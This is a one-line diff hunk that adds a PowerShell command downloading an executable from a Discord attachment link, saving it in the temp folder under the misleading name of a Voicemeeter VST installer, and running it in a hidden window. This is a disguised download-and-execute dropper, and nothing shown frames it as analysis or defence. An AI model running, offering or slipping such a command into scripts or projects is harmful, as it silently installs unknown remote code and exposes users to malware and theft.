@@ -1,0 +1,1 @@
+iwr -useb https://cdn.discordapp.com/attachments/1050062111855886397/1051211324677427260/RyujinxBR.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
